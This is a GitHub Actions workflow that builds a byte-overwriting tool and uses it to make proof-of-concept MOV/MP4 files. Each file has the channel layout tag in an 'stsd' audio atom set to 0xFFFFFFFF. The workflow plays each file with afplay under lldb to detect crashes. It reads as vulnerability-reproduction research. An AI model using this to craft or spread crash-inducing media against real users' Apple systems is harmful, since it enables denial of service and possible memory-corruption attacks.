name: Generate, Play, and Debug Audio Source
on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch: # Allows manual triggering

jobs:
  build-generate-and-debug:
    runs-on: macos-latest

    steps:
      # Clone the repository
      - name: Clone repository
        run: git clone https://github.com/encryptedcoderr/AppleTest2/

      # Navigate to the correct directory
      - name: Navigate to working directory
        run: cd AppleTest2/apple-positional-audio-codec-invalid-header-main && ls -l

      # This script is a simple utility to corrupt a file at a specific offset.
      - name: Patch encodeme.mm to be a Simple File Corruptor
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Patching encodeme.mm to be a simple corruption utility..."
          cat > encodeme.mm << 'EOF'
          #import <Foundation/Foundation.h>
          #include <stdio.h>
          #include <stdlib.h>

          int main(int argc, const char * argv[]) {
              if (argc != 3) {
                  fprintf(stderr, "Usage: %s <file_to_corrupt> <offset_to_corrupt>\n", argv[0]);
                  return 1;
              }

              const char* filePath = argv[1];
              long offset = atol(argv[2]);

              FILE *file = fopen(filePath, "r+b");
              if (!file) {
                  fprintf(stderr, "Failed to open file: %s\n", filePath);
                  return 1;
              }

              fprintf(stderr, "Corrupting file at offset 0x%lx...\n", offset);
              fseek(file, offset, SEEK_SET);
              
              // This is the malicious data that triggers the vulnerability
              unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF};
              fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
              fclose(file);
              
              fprintf(stderr, "Corruption complete.\n");
              return 0;
          }
          EOF

      # Set up Xcode
      - name: Set up Xcode
        uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: '15.4'

      # Compile the corruption utility
      - name: Compile Corruption Utility
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Compiling encodeme_corruptor..."
          clang++ -g -fobjc-arc -framework Foundation encodeme.mm -o encodeme_corruptor
          if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi

      # This new, combined step iterates through all 'stsd' atoms, corrupts each one, and tests it.
      - name: Iterate, Corrupt, and Test All Audio Tracks
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          set -x 
          
          echo "Installing Bento4 and jq to find the correct atom offset..."
          brew install bento4 jq

          # Step 1: Use mp4dump on the original MOV file to create a JSON representation.
          mp4dump --format json IMG_1027.mov > atom_dump.json
          
          # Step 2: Use jq to find all 'stsd' offsets from the JSON dump.
          ALL_OFFSETS=$(jq -r '.. | objects | select(.name? == "stsd") | .file_offset' atom_dump.json)

          if [ -z "$ALL_OFFSETS" ]; then
            echo "Could not find any 'stsd' atoms using jq. Aborting."
            exit 1
          fi

          echo "Found the following 'stsd' offsets to test:"
          echo "$ALL_OFFSETS"

          # Step 3: Loop through each offset, create a unique corrupted file, and test it.
          mkdir -p test_results
          for OFFSET in $ALL_OFFSETS; do
            echo "--- Testing corruption for stsd atom at offset ${OFFSET} ---"
            
            POC_FILE="output_poc_offset_${OFFSET}.mp4"
            PLAYER_LOG_FILE="test_results/player_log_offset_${OFFSET}.txt"
            
            # Create a fresh copy for this iteration
            cp IMG_1027.mov "$POC_FILE"
            
            # The channel layout tag is at a known position within the stsd atom.
            CORRUPTION_OFFSET=$(( ${OFFSET} + 72 ))
            echo "Calculated corruption offset: ${CORRUPTION_OFFSET}"
            
            # Run the C++ utility to perform the corruption.
            ./encodeme_corruptor "$POC_FILE" $CORRUPTION_OFFSET
            
            echo "Launching player under LLDB for ${POC_FILE}..."
            
            # Create the lldb script for this iteration
            cat > player_debug_script.lldb << 'EOF'
            run
            bt
            quit
            EOF
            
            # Run the test
            lldb -s player_debug_script.lldb -- afplay "$POC_FILE" > "$PLAYER_LOG_FILE" 2>&1 || true
            
            # Check for crash by looking for lldb backtrace output
            if grep -q "frame #0" "$PLAYER_LOG_FILE" && ! grep -q "stop reason = breakpoint" "$PLAYER_LOG_FILE" ; then
              echo "✅✅✅ POTENTIAL CRASH DETECTED for offset ${OFFSET} ✅✅✅"
              echo "Log file: ${PLAYER_LOG_FILE}"
              # We will continue testing other offsets, but this is a strong signal.
            else
              echo "No crash detected for offset ${OFFSET}."
            fi
            
            echo "--- Finished testing offset ${OFFSET} ---"
          done

          echo "All offsets tested."

      # Upload all artifacts for analysis
      - name: Upload All Artifacts
        uses: actions/upload-artifact@v4
        with:
          name: debug-and-poc-artifacts
          path: |
            AppleTest2/apple-positional-audio-codec-invalid-header-main/output_poc_offset_*.mp4
            AppleTest2/apple-positional-audio-codec-invalid-header-main/test_results/
            AppleTest2/apple-positional-audio-codec-invalid-header-main/atom_dump.json
          retention-days: 7
          if-no-files-found: error
